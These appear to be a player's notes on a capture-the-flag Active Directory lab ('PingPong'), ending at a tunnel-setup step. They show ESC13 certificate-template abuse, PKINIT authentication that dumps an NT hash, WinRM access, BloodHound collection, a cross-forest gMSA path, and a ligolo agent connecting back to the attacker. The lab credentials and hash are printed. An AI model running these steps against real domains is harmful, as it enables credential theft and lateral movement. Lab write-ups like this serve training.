As is common in real life pentests, you will start the PingPong box with credentials for the following account c.roberts / AssumedBreach123
### Nmap
```
nmap -sV -sC -vv 10.129.39.79

---OUTPUT---
Nmap scan report for 10.129.39.79
Host is up, received echo-reply ttl 127 (0.029s latency).
Scanned at 2026-04-27 04:56:16 EDT for 92s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-27 16:56:26Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Issuer: commonName=ping-DC1-CA/domainComponent=ping
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-20T18:54:50
| Not valid after:  2106-04-20T18:54:50
| MD5:     76f1 cc4a 1f6c 0942 141b 551e 31d4 8c32
| SHA-1:   938c 7f61 d13d cfb8 1629 e02f f3dc 7a56 6f04 714c
| SHA-256: e00e be1c 40ed 4b32 aabf 56a1 53df 2b89 f899 ea02 8462 e3dc db9e 25be 8ca2 4730
| -----BEGIN CERTIFICATE-----
| MIIF1jCCBL6gAwIBAgITHAAAABBXNgfx016uKwACAAAAEDANBgkqhkiG9w0BAQsF
| ADBBMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEcGluZzEU
| MBIGA1UEAxMLcGluZy1EQzEtQ0EwIBcNMjYwNDIwMTg1NDUwWhgPMjEwNjA0MjAx
| ODU0NTBaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4oA+lzH17
| zBUauEXc+KI0rvaZKP6EYV34FGEYOto36KlEeWuJVIxfJUAA8uws2WM8Ku0+yRMF
| De5KtitSD5qDUZy87QL9Mewbwu1/XWjuhbYIslo+xq2yXXolqxaDEwN5uwKYwpRt
| S5+fmQob8MahVp8T8gKEKjYirht+DQA86ejVvYIE2fffA8JunIZAdcEDifX+A32b
| BGVnjz2B5y00olpB7rdrhSM30GKgRTq28U4S3zcmSj8A1ZxUky1fj8EZls7VaE7Z
| IDvVo3x4/4+Og33C0Xio2euWUxOvkN6ihD8K7tbiAPwbuuJcxxYSLECeU4TIDgVX
| 4sX3FUmBEoNpAgMBAAGjggMEMIIDADA3BgkrBgEEAYI3FQcEKjAoBiArBgEEAYI3
| FQiC4sJhgfm1YoaBjSX+l3aEoO87gVYBIQIBbgIBADAyBgNVHSUEKzApBggrBgEF
| BQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUwDgYDVR0PAQH/BAQD
| AgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwEwDAYK
| KwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBTf8xLW2hUhKLVgFFLTYeyL
| wxhlFDAfBgNVHSMEGDAWgBQwyA7RMsrOrWzwAmsfjoCaa5tCmTCBxQYDVR0fBIG9
| MIG6MIG3oIG0oIGxhoGubGRhcDovLy9DTj1waW5nLURDMS1DQSgyKSxDTj1kYzEs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9cGluZyxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0
| aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG6
| BggrBgEFBQcBAQSBrTCBqjCBpwYIKwYBBQUHMAKGgZpsZGFwOi8vL0NOPXBpbmct
| REMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
| aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXBpbmcsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1Ud
| EQEB/wQgMB6CDGRjMS5waW5nLmh0YoIIcGluZy5odGKCBFBJTkcwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTc1MDYzNTYyNC0yMDU4
| NzIxOTAxLTE5MzIzMzgzOTEtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAC/FMPSx+
| QwynyJ4ILaexQmifWpp9Q4x9SOr+oYmoP5PiY0oah5LjePJHyteXjLPumOpfcT3n
| eBN5WZK7E0dPk/5NQ5tW1OBo0ICbVBT9BExAdlBa06LM9fx1Ih25/WjqdPqREOBw
| f3Q660aGgsaej75UrLkh03k/v7krVZjaPaBiYHwGIEvebuVPVJGmrXiolLirVEDz
| rMTaJP8vC3KnLIh3KUIrDLcSMDq8dPUTqyRpyUnvSPOAFk07in7kHhjGjzznX/sl
| XIPba/Oa19poYE26tpxNhhs/s75GAstQE8PPhGxkrb3jFYKF0FA7kfM725mJq+Tv
| 8OK8tm98KSpwtw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Issuer: commonName=ping-DC1-CA/domainComponent=ping
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-20T18:54:50
| Not valid after:  2106-04-20T18:54:50
| MD5:     76f1 cc4a 1f6c 0942 141b 551e 31d4 8c32
| SHA-1:   938c 7f61 d13d cfb8 1629 e02f f3dc 7a56 6f04 714c
| SHA-256: e00e be1c 40ed 4b32 aabf 56a1 53df 2b89 f899 ea02 8462 e3dc db9e 25be 8ca2 4730
| -----BEGIN CERTIFICATE-----
| MIIF1jCCBL6gAwIBAgITHAAAABBXNgfx016uKwACAAAAEDANBgkqhkiG9w0BAQsF
| ADBBMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEcGluZzEU
| MBIGA1UEAxMLcGluZy1EQzEtQ0EwIBcNMjYwNDIwMTg1NDUwWhgPMjEwNjA0MjAx
| ODU0NTBaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4oA+lzH17
| zBUauEXc+KI0rvaZKP6EYV34FGEYOto36KlEeWuJVIxfJUAA8uws2WM8Ku0+yRMF
| De5KtitSD5qDUZy87QL9Mewbwu1/XWjuhbYIslo+xq2yXXolqxaDEwN5uwKYwpRt
| S5+fmQob8MahVp8T8gKEKjYirht+DQA86ejVvYIE2fffA8JunIZAdcEDifX+A32b
| BGVnjz2B5y00olpB7rdrhSM30GKgRTq28U4S3zcmSj8A1ZxUky1fj8EZls7VaE7Z
| IDvVo3x4/4+Og33C0Xio2euWUxOvkN6ihD8K7tbiAPwbuuJcxxYSLECeU4TIDgVX
| 4sX3FUmBEoNpAgMBAAGjggMEMIIDADA3BgkrBgEEAYI3FQcEKjAoBiArBgEEAYI3
| FQiC4sJhgfm1YoaBjSX+l3aEoO87gVYBIQIBbgIBADAyBgNVHSUEKzApBggrBgEF
| BQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUwDgYDVR0PAQH/BAQD
| AgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwEwDAYK
| KwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBTf8xLW2hUhKLVgFFLTYeyL
| wxhlFDAfBgNVHSMEGDAWgBQwyA7RMsrOrWzwAmsfjoCaa5tCmTCBxQYDVR0fBIG9
| MIG6MIG3oIG0oIGxhoGubGRhcDovLy9DTj1waW5nLURDMS1DQSgyKSxDTj1kYzEs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9cGluZyxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0
| aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG6
| BggrBgEFBQcBAQSBrTCBqjCBpwYIKwYBBQUHMAKGgZpsZGFwOi8vL0NOPXBpbmct
| REMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
| aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXBpbmcsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1Ud
| EQEB/wQgMB6CDGRjMS5waW5nLmh0YoIIcGluZy5odGKCBFBJTkcwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTc1MDYzNTYyNC0yMDU4
| NzIxOTAxLTE5MzIzMzgzOTEtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAC/FMPSx+
| QwynyJ4ILaexQmifWpp9Q4x9SOr+oYmoP5PiY0oah5LjePJHyteXjLPumOpfcT3n
| eBN5WZK7E0dPk/5NQ5tW1OBo0ICbVBT9BExAdlBa06LM9fx1Ih25/WjqdPqREOBw
| f3Q660aGgsaej75UrLkh03k/v7krVZjaPaBiYHwGIEvebuVPVJGmrXiolLirVEDz
| rMTaJP8vC3KnLIh3KUIrDLcSMDq8dPUTqyRpyUnvSPOAFk07in7kHhjGjzznX/sl
| XIPba/Oa19poYE26tpxNhhs/s75GAstQE8PPhGxkrb3jFYKF0FA7kfM725mJq+Tv
| 8OK8tm98KSpwtw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
2179/tcp open  vmrdp?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Issuer: commonName=ping-DC1-CA/domainComponent=ping
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-20T18:54:50
| Not valid after:  2106-04-20T18:54:50
| MD5:     76f1 cc4a 1f6c 0942 141b 551e 31d4 8c32
| SHA-1:   938c 7f61 d13d cfb8 1629 e02f f3dc 7a56 6f04 714c
| SHA-256: e00e be1c 40ed 4b32 aabf 56a1 53df 2b89 f899 ea02 8462 e3dc db9e 25be 8ca2 4730
| -----BEGIN CERTIFICATE-----
| MIIF1jCCBL6gAwIBAgITHAAAABBXNgfx016uKwACAAAAEDANBgkqhkiG9w0BAQsF
| ADBBMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEcGluZzEU
| MBIGA1UEAxMLcGluZy1EQzEtQ0EwIBcNMjYwNDIwMTg1NDUwWhgPMjEwNjA0MjAx
| ODU0NTBaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4oA+lzH17
| zBUauEXc+KI0rvaZKP6EYV34FGEYOto36KlEeWuJVIxfJUAA8uws2WM8Ku0+yRMF
| De5KtitSD5qDUZy87QL9Mewbwu1/XWjuhbYIslo+xq2yXXolqxaDEwN5uwKYwpRt
| S5+fmQob8MahVp8T8gKEKjYirht+DQA86ejVvYIE2fffA8JunIZAdcEDifX+A32b
| BGVnjz2B5y00olpB7rdrhSM30GKgRTq28U4S3zcmSj8A1ZxUky1fj8EZls7VaE7Z
| IDvVo3x4/4+Og33C0Xio2euWUxOvkN6ihD8K7tbiAPwbuuJcxxYSLECeU4TIDgVX
| 4sX3FUmBEoNpAgMBAAGjggMEMIIDADA3BgkrBgEEAYI3FQcEKjAoBiArBgEEAYI3
| FQiC4sJhgfm1YoaBjSX+l3aEoO87gVYBIQIBbgIBADAyBgNVHSUEKzApBggrBgEF
| BQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUwDgYDVR0PAQH/BAQD
| AgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwEwDAYK
| KwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBTf8xLW2hUhKLVgFFLTYeyL
| wxhlFDAfBgNVHSMEGDAWgBQwyA7RMsrOrWzwAmsfjoCaa5tCmTCBxQYDVR0fBIG9
| MIG6MIG3oIG0oIGxhoGubGRhcDovLy9DTj1waW5nLURDMS1DQSgyKSxDTj1kYzEs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9cGluZyxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0
| aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG6
| BggrBgEFBQcBAQSBrTCBqjCBpwYIKwYBBQUHMAKGgZpsZGFwOi8vL0NOPXBpbmct
| REMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
| aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXBpbmcsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1Ud
| EQEB/wQgMB6CDGRjMS5waW5nLmh0YoIIcGluZy5odGKCBFBJTkcwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTc1MDYzNTYyNC0yMDU4
| NzIxOTAxLTE5MzIzMzgzOTEtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAC/FMPSx+
| QwynyJ4ILaexQmifWpp9Q4x9SOr+oYmoP5PiY0oah5LjePJHyteXjLPumOpfcT3n
| eBN5WZK7E0dPk/5NQ5tW1OBo0ICbVBT9BExAdlBa06LM9fx1Ih25/WjqdPqREOBw
| f3Q660aGgsaej75UrLkh03k/v7krVZjaPaBiYHwGIEvebuVPVJGmrXiolLirVEDz
| rMTaJP8vC3KnLIh3KUIrDLcSMDq8dPUTqyRpyUnvSPOAFk07in7kHhjGjzznX/sl
| XIPba/Oa19poYE26tpxNhhs/s75GAstQE8PPhGxkrb3jFYKF0FA7kfM725mJq+Tv
| 8OK8tm98KSpwtw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Issuer: commonName=ping-DC1-CA/domainComponent=ping
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-20T18:54:50
| Not valid after:  2106-04-20T18:54:50
| MD5:     76f1 cc4a 1f6c 0942 141b 551e 31d4 8c32
| SHA-1:   938c 7f61 d13d cfb8 1629 e02f f3dc 7a56 6f04 714c
| SHA-256: e00e be1c 40ed 4b32 aabf 56a1 53df 2b89 f899 ea02 8462 e3dc db9e 25be 8ca2 4730
| -----BEGIN CERTIFICATE-----
| MIIF1jCCBL6gAwIBAgITHAAAABBXNgfx016uKwACAAAAEDANBgkqhkiG9w0BAQsF
| ADBBMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEcGluZzEU
| MBIGA1UEAxMLcGluZy1EQzEtQ0EwIBcNMjYwNDIwMTg1NDUwWhgPMjEwNjA0MjAx
| ODU0NTBaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4oA+lzH17
| zBUauEXc+KI0rvaZKP6EYV34FGEYOto36KlEeWuJVIxfJUAA8uws2WM8Ku0+yRMF
| De5KtitSD5qDUZy87QL9Mewbwu1/XWjuhbYIslo+xq2yXXolqxaDEwN5uwKYwpRt
| S5+fmQob8MahVp8T8gKEKjYirht+DQA86ejVvYIE2fffA8JunIZAdcEDifX+A32b
| BGVnjz2B5y00olpB7rdrhSM30GKgRTq28U4S3zcmSj8A1ZxUky1fj8EZls7VaE7Z
| IDvVo3x4/4+Og33C0Xio2euWUxOvkN6ihD8K7tbiAPwbuuJcxxYSLECeU4TIDgVX
| 4sX3FUmBEoNpAgMBAAGjggMEMIIDADA3BgkrBgEEAYI3FQcEKjAoBiArBgEEAYI3
| FQiC4sJhgfm1YoaBjSX+l3aEoO87gVYBIQIBbgIBADAyBgNVHSUEKzApBggrBgEF
| BQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUwDgYDVR0PAQH/BAQD
| AgWgMEAGCSsGAQQBgjcVCgQzMDEwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwEwDAYK
| KwYBBAGCNxQCAjAJBgcrBgEFAgMFMB0GA1UdDgQWBBTf8xLW2hUhKLVgFFLTYeyL
| wxhlFDAfBgNVHSMEGDAWgBQwyA7RMsrOrWzwAmsfjoCaa5tCmTCBxQYDVR0fBIG9
| MIG6MIG3oIG0oIGxhoGubGRhcDovLy9DTj1waW5nLURDMS1DQSgyKSxDTj1kYzEs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9cGluZyxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0
| aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG6
| BggrBgEFBQcBAQSBrTCBqjCBpwYIKwYBBQUHMAKGgZpsZGFwOi8vL0NOPXBpbmct
| REMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
| aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXBpbmcsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1Ud
| EQEB/wQgMB6CDGRjMS5waW5nLmh0YoIIcGluZy5odGKCBFBJTkcwTgYJKwYBBAGC
| NxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTc1MDYzNTYyNC0yMDU4
| NzIxOTAxLTE5MzIzMzgzOTEtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAC/FMPSx+
| QwynyJ4ILaexQmifWpp9Q4x9SOr+oYmoP5PiY0oah5LjePJHyteXjLPumOpfcT3n
| eBN5WZK7E0dPk/5NQ5tW1OBo0ICbVBT9BExAdlBa06LM9fx1Ih25/WjqdPqREOBw
| f3Q660aGgsaej75UrLkh03k/v7krVZjaPaBiYHwGIEvebuVPVJGmrXiolLirVEDz
| rMTaJP8vC3KnLIh3KUIrDLcSMDq8dPUTqyRpyUnvSPOAFk07in7kHhjGjzznX/sl
| XIPba/Oa19poYE26tpxNhhs/s75GAstQE8PPhGxkrb3jFYKF0FA7kfM725mJq+Tv
| 8OK8tm98KSpwtw==
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52013/tcp): CLEAN (Timeout)
|   Check 2 (port 34902/tcp): CLEAN (Timeout)
|   Check 3 (port 56155/udp): CLEAN (Timeout)
|   Check 4 (port 51605/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-04-27T16:57:08
|_  start_date: N/A
|_clock-skew: 7h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

- Can't do normal authentication but I manage to get a ticket for user `c.roberts`:
```
faketime "+8hours" impacket-getTGT 'ping.htb/c.roberts:AssumedBreach123' -dc-ip 10.129.43.72
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.roberts.ccache
```
- Export the ticket:
```
export KRB5CCNAME=c.roberts.ccache
```
![[Pasted image 20260427050600.png]]- I look for vulenrable templates and find TemporaryWinRMTemplate:

```
faketime "+8hours" certipy-ad find -u c.roberts@ping.htb -k -no-pass -dc-ip 10.129.43.72 -target dc1.ping.htb -vulnerable -stdout

---OUTPUT---
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 20 issuance policies
[*] Found 1 OID linked to a template
[*] Retrieving CA configuration for 'ping-DC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'ping-DC1-CA'
[*] Checking web enrollment for CA 'ping-DC1-CA' @ 'dc1.ping.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ping-DC1-CA
    DNS Name                            : dc1.ping.htb
    Certificate Subject                 : CN=ping-DC1-CA, DC=ping, DC=htb
    Certificate Serial Number           : 6F8E726EEFA64B894CE82D498BC27632
    Certificate Validity Start          : 2026-04-20 18:54:41+00:00
    Certificate Validity End            : 2126-04-20 19:04:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : PING.HTB\Administrators
      Access Rights
        ManageCa                        : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        ManageCertificates              : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Enroll                          : PING.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : TemporaryWinRM
    Display Name                        : Temporary WinRM
    Certificate Authorities             : ping-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-12-23T17:19:28+00:00
    Template Last Modified              : 2025-12-27T21:12:15+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5808481.4086498.12600997.2067446.8927163.214.489503.1996623
    Linked Groups                       : CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : PING.HTB\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'.
```
![[Pasted image 20260427062126.png]]

- I request the certificate (works without target argument but will get warning):
```
faketime "+8hours" certipy-ad req -u c.roberts -k -no-pass -dc-ip 10.129.43.72 -dc-host dc1.ping.htb -target dc1.ping.htb  -template TemporaryWinRM -ca PING-DC1-CA

---OUTPUT---
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[*] Successfully requested certificate
[*] Got certificate with UPN 'C.Roberts@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Saving certificate and private key to 'c.roberts.pfx'
[*] Wrote certificate and private key to 'c.roberts.pfx'

```
![[Pasted image 20260427062156.png]]

- I authenticate and get hash for c.roberts, this requests another TGT but isntead of AS-REP we are using PKINIT
  
  This TGT is is obtained using PKINIT — a Kerberos extension that lets you authenticate using a certificate + private key instead of a password. The DC verifies your certificate was signed by a trusted CA, then issues you a TGT:
```
faketime "+8hours" certipy-ad auth -pfx c.roberts.pfx -domain ping.htb -dc-ip 10.129.43.72
                                                                     
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'C.Roberts@ping.htb'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Using principal: 'c.roberts@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'c.roberts.ccache'
File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'c.roberts.ccache'
[*] Trying to retrieve NT hash for 'c.roberts'
[*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d
```
![[Pasted image 20260427062236.png]]

- Make sure `/etc/krb5.conf` is set right(included pong.htb for later):
```
cat /etc/krb5.conf                                                
[libdefaults]
    default_realm = PING.HTB

[realms]
    PING.HTB = {
        kdc = 10.129.40.41
        admin_server = 10.129.40.41
    }
    PONG.HTB = {
        kdc = 192.168.2.2
        admin_server = 192.168.2.2
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
    .pong.htb = PONG.HTB
    pong.htb = PONG.HTB

```
- Using this hash I can log into the target:
```
export KRB5CCNAME=c.roberts.ccache
faketime "+8hours" evil-winrm -i dc1.ping.htb -r ping.htb
```
![[Pasted image 20260427062318.png]]

- I get bloodhound files using SharpHound.exe
- ```
  .\SharpHound.exe -c All
  ```

- The ingestion fails and looking at the output I see a domain pong.htb:
![[Pasted image 20260427063309.png]]

_ re extract the files specifying the domain:

```
.\SharpHound.exe -c All --domain ping.htb
```
- I take all files but domains.json and it uploads but dont find anythign interesting.

- I check pong.lhtb IP:
```
nslookup pong.htb
nslookup.exe : Non-authoritative answer:
    + CategoryInfo          : NotSpecified: (Non-authoritative answer::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Server:  localhost
Address:  127.0.0.1

Name:    pong.htb
Address:  192.168.2.2
```

- i try bloodhound-python but that fails too (only partial upload)
```
faketime "+8hours" bloodhound-python \
  -u c.roberts@ping.htb \
  -k -no-pass \
  --dns-tcp \
  -ns 10.129.39.94 \
  -d ping.htb \
  -dc dc1.ping.htb \
  -c All,Trusts \
  --use-ldaps \
  --zip
```

- Finally with rusthound I get a full list to analyze:
```
faketime "+8hours" rusthound-ce \ 
  -d ping.htb \
  -u c.roberts@ping.htb \
  -i 10.129.39.94 \
  -f dc1.ping.htb \
  -n 10.129.39.94 \
  -k --ldaps --dns-tcp \
  -z -o ./bh-ping/
```
![[Pasted image 20260427155833.png]]

- I find a cross forest relationship between `ping.com` and `pong.com`. Maybe I can transfer my user to `pong.com` domain:
![[Pasted image 20260427155941.png]]

- looking at gmSA accounts I find a pong SID with read GMSA password on gMSA$
![[Pasted image 20260427193405.png]]
- Resolving this name I get `gMSA Managers`
```
$sid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-2410575906-3092493790-2123333151-1104")
$sid.Translate([System.Security.Principal.NTAccount])

Value
-----
pong\gMSA Managers
```
![[Pasted image 20260427193534.png]]
- Apparently c.roberts has writedacl on gMSA_Managers but ctive Directory forbids adding cross-forest principals into Global groups — the add silently fails with WILL_NOT_PERFORM. The fix is to flip the group to Domain Local first, then add the cross-forest FSP.
- We build a ligolo tunnel to 192.168.1.0/24 (check ipconfig and ping `pong.htb` can also check nmap)
![[Pasted image 20260427193923.png]]
```
---ON-ATTACKER---
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.2.0/24 dev ligolo

./proxy -selfcert -laddr 0.0.0.0:9000

---ON TARGET---
.\agent.exe  -connect 10.10.17.167:9000 -ignore-cert
```
